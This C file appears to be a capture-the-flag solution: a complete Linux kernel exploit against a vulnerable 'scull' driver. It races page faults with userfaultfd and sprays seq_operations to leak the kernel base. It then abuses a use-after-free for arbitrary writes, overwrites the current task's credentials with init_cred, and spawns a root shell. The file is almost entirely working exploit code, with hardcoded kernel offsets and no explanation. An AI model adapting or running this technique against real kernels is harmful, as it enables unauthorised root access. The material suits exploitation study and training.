#define _GNU_SOURCE

#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <syscall.h>
#include <unistd.h>

#define PAGE_SIZE 4096
static const unsigned long current_task = 0x15C00UL;
static const unsigned long abs_kernel = 0xFFFFFFFF81000000UL;
static const unsigned long abs_single_start = 0xFFFFFFFF812E44E0UL;
static const unsigned long abs_pcpu_base_addr = 0xFFFFFFFF823E6038UL;
static const unsigned long abs_init_cred = 0xFFFFFFFF8265F880UL;
#define SIZEOF_SEQ_OPERATIONS 32
#define OFFSETOF_TASK_CRED 0xa48

#define SCULL_PATH "/dev/scull"
#define SCULL1_PATH "/dev/scull1"
#define SCULL2_PATH "/dev/scull2"
#define SCULL3_PATH "/dev/scull3"
#define SCULL_QUANTUM 4000
#define SCULL_QSET 1000
#define SCULL_ITEMSIZE (SCULL_QUANTUM * SCULL_QSET)
#define SCULL_IOC_MAGIC 'k'
#define SCULL_IOCTQUANTUM _IO(SCULL_IOC_MAGIC, 3)
#define SCULL_IOCTQSET _IO(SCULL_IOC_MAGIC, 4)

struct fault_handler {
  const char *desc;
  pthread_t thread;
  void *page;
  int uffd;
  char value[PAGE_SIZE];
  void (*callback)(void *);
  void *arg;
};

static void *fault_handler_thread(void *arg) {
  struct fault_handler *fh = arg;

  struct pollfd pollfd;
  pollfd.fd = fh->uffd;
  pollfd.events = POLLIN;
  int nready = poll(&pollfd, 1, -1);
  printf("[*] poll({%s, POLLIN}) = %d\n", fh->desc, nready);
  assert(nready >= 0);

  struct uffd_msg msg;
  ssize_t nread = read(fh->uffd, &msg, sizeof(msg));
  printf("[*] read(%s) = %zd\n", fh->desc, nread);
  assert(nread == sizeof(msg));
  assert(msg.event == UFFD_EVENT_PAGEFAULT);
  assert(msg.arg.pagefault.address == (__u64)fh->page);

  fh->callback(fh->arg);

  struct uffdio_copy uffdio_copy;
  uffdio_copy.src = (__u64)fh->value;
  uffdio_copy.dst = (__u64)fh->page;
  uffdio_copy.len = PAGE_SIZE;
  uffdio_copy.mode = 0;
  uffdio_copy.copy = 0;
  int ret = ioctl(fh->uffd, (int)UFFDIO_COPY, &uffdio_copy);
  printf("[*] ioctl(%s, UFFDIO_COPY) = %d\n", fh->desc, ret);
  assert(ret == 0);

  return NULL;
}

static void fault_handler_init(struct fault_handler *fh, const char *desc,
                               unsigned long value, void (*callback)(void *),
                               void *arg) {
  fh->desc = desc;
  *(unsigned long *)fh->value = value;
  fh->callback = callback;
  fh->arg = arg;

  fh->page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  printf("[*] %s->page = %p\n", fh->desc, fh->page);
  assert(fh->page != MAP_FAILED);

  fh->uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  printf("[*] %s->uffd = %d\n", fh->desc, fh->uffd);
  assert(fh->uffd != -1);

  struct uffdio_api uffdio_api;
  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  int ret = ioctl(fh->uffd, (int)UFFDIO_API, &uffdio_api);
  printf("[*] ioctl(%s, UFFDIO_API) = %d\n", fh->desc, ret);
  assert(ret == 0);

  struct uffdio_register uffdio_register;
  uffdio_register.range.start = (unsigned long)fh->page;
  uffdio_register.range.len = PAGE_SIZE;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  ret = ioctl(fh->uffd, (int)UFFDIO_REGISTER, &uffdio_register);
  printf("[*] ioctl(%s, UFFDIO_REGISTER) = %d\n", fh->desc, ret);
  assert(ret == 0);

  ret = pthread_create(&fh->thread, NULL, fault_handler_thread, fh);
  printf("[*] pthread_create(%s) = %d\n", fh->desc, ret);
  assert(ret == 0);
}

static void fault_handler_destroy(struct fault_handler *fh) {
  void *retval;
  pthread_join(fh->thread, &retval);
  close(fh->uffd);
  munmap(fh->page, PAGE_SIZE);
}

static void scull_trim(const char *path) {
  int tmp_fd = open(path, O_WRONLY);
  assert(tmp_fd != -1);
  close(tmp_fd);
}

struct leak_kernel_ctx {
  int seq_operations_fds[1000];
};

static void spray_seq_operations(int *fds, size_t n) {
  for (size_t i = 0; i < n; i++) {
    fds[i] = open("/proc/self/stat", O_RDONLY);
    assert(fds[i] != -1);
  }
}

static void free_seq_operations(int *fds, size_t n) {
  for (size_t i = 0; i < n; i++)
    close(fds[i]);
}

static void leak_kernel_callback(void *arg) {
  struct leak_kernel_ctx *ctx = arg;

  printf("[*] Freeing the quantum...\n");
  scull_trim(SCULL_PATH);

  printf("[*] Spraying seq_operations...\n");
  spray_seq_operations(ctx->seq_operations_fds,
                       sizeof(ctx->seq_operations_fds) /
                           sizeof(ctx->seq_operations_fds[0]));
}

static void set_quantum_qset(int scull_fd, int quantum, int qset,
                             const char *path) {
  printf("[*] Setting quantum and qset module parameters...\n");
  int ioctl_ret = ioctl(scull_fd, SCULL_IOCTQUANTUM, quantum);
  assert(ioctl_ret == 0);
  ioctl_ret = ioctl(scull_fd, SCULL_IOCTQSET, qset);
  assert(ioctl_ret == 0);

  printf("[*] Updating %s's quantum and qset...\n", path);
  scull_trim(path);
}

static void alloc_quantum(int scull_fd, int quantum, const char *desc) {
  printf("[*] Allocating a %s quantum...\n", desc);
  off_t lseek_ret = lseek(scull_fd, 0, SEEK_SET);
  assert(lseek_ret != -1);
  char *tmp = calloc(1, quantum);
  assert(tmp);
  ssize_t write_ret = write(scull_fd, tmp, quantum);
  printf("[*] write(%d, %p, %zu) = %zd (errno=%d)\n", scull_fd, tmp,
         sizeof(tmp), write_ret, errno);
  assert(write_ret == quantum);
  free(tmp);
  lseek_ret = lseek(scull_fd, 0, SEEK_SET);
  assert(lseek_ret != -1);
}

static unsigned long leak_kernel(int scull_fd) {
  set_quantum_qset(scull_fd, SIZEOF_SEQ_OPERATIONS, 1, SCULL_PATH);

  while (1) {
    alloc_quantum(scull_fd, SIZEOF_SEQ_OPERATIONS, "scull");

    struct leak_kernel_ctx ctx;
    struct fault_handler fh;
    fault_handler_init(&fh, "leak_kernel", 0, leak_kernel_callback, &ctx);

    ssize_t read_ret = read(scull_fd, fh.page, SIZEOF_SEQ_OPERATIONS);
    printf("[*] read(%d, %p, %d) = %zd (errno=%d)\n", scull_fd, fh.page,
           SIZEOF_SEQ_OPERATIONS, read_ret, errno);
    assert(read_ret == SIZEOF_SEQ_OPERATIONS);

    unsigned long leak = *(unsigned long *)fh.page;
    printf("[*] leak = 0x%lx\n", leak);

    free_seq_operations(ctx.seq_operations_fds,
                        sizeof(ctx.seq_operations_fds) /
                            sizeof(ctx.seq_operations_fds[0]));
    fault_handler_destroy(&fh);

    unsigned long kernel = leak - (abs_single_start - abs_kernel);
    if ((kernel & 0xfff) == 0) {
      printf("[*] kernel = 0x%lx\n", kernel);
      return kernel;
    }
  }
}

struct overwrite_ctx {
  int scullx_fd;
  const char *scullx_path;
};

static void overwrite_callback(void *arg) {
  struct overwrite_ctx *ctx = arg;

  printf("[*] Freeing the quantum...\n");
  scull_trim(SCULL_PATH);

  alloc_quantum(ctx->scullx_fd, 8, ctx->scullx_path);
}

static int overwrite(int scull_fd, const char *scullx_path,
                     unsigned long addr) {
  int scullx_fd = open(scullx_path, O_RDWR);
  printf("[*] scullx_fd = %d\n", scullx_fd);
  assert(scullx_fd != -1);
  int qset3 = 1024; /* kmalloc-8k */
  set_quantum_qset(scullx_fd, 8, qset3, scullx_path);

  int quantum = qset3 * sizeof(char *);
  set_quantum_qset(scull_fd, quantum, 1, SCULL_PATH);
  alloc_quantum(scull_fd, quantum, "scull");

  struct overwrite_ctx ctx;
  ctx.scullx_fd = scullx_fd;
  ctx.scullx_path = scullx_path;
  struct fault_handler fh;
  fault_handler_init(&fh, "overwrite", addr, overwrite_callback, &ctx);

  int write_ret = write(scull_fd, fh.page, sizeof(addr));
  assert(write_ret == sizeof(addr));

  return scullx_fd;
}

int main() {
  printf("[*] Binding to CPU 0...\n");
  cpu_set_t aff;
  CPU_ZERO(&aff);
  CPU_SET(0, &aff);
  int setaffinity_ret = sched_setaffinity(0, sizeof(cpu_set_t), &aff);
  assert(setaffinity_ret == 0);

  int scull_fd = open(SCULL_PATH, O_RDWR);
  printf("[*] scull_fd = %d\n", scull_fd);
  assert(scull_fd != -1);

  unsigned long kernel = leak_kernel(scull_fd);

  unsigned long percpu0 = 0;
  {
    int scull1_fd = overwrite(scull_fd, SCULL1_PATH,
                              kernel + (abs_pcpu_base_addr - abs_kernel));
    ssize_t read_ret = read(scull1_fd, &percpu0, sizeof(percpu0));
    printf("[*] read(%d, %p, %zu) = %zd (errno=%d)\n", scull1_fd,
           (void *)&percpu0, sizeof(percpu0), read_ret, errno);
    assert(read_ret == sizeof(percpu0));
    printf("[*] percpu0 = 0x%lx\n", percpu0);
  }

  unsigned long current = 0;
  {
    int scull2_fd = overwrite(scull_fd, SCULL2_PATH, percpu0 + current_task);
    ssize_t read_ret = read(scull2_fd, &current, sizeof(current));
    printf("[*] read(%d, %p, %zu) = %zd (errno=%d)\n", scull2_fd,
           (void *)&current, sizeof(current), read_ret, errno);
    assert(read_ret == sizeof(current));
    printf("[*] current = 0x%lx\n", current);
  }

  {
    int scull3_fd =
        overwrite(scull_fd, SCULL3_PATH, current + OFFSETOF_TASK_CRED);
    unsigned long init_cred = kernel + (abs_init_cred - abs_kernel);
    printf("[*] init_cred = 0x%lx\n", init_cred);
    ssize_t write_ret = write(scull3_fd, &init_cred, sizeof(init_cred));
    printf("[*] write(%d, %p, %zu) = %zd (errno=%d)\n", scull3_fd,
           (void *)&init_cred, sizeof(init_cred), write_ret, errno);
    assert(write_ret == sizeof(init_cred));
  }

  system("/bin/sh");
  /* WhiteHat{scU11_Scull_driv3r_h4h4_38842_s2} */
}
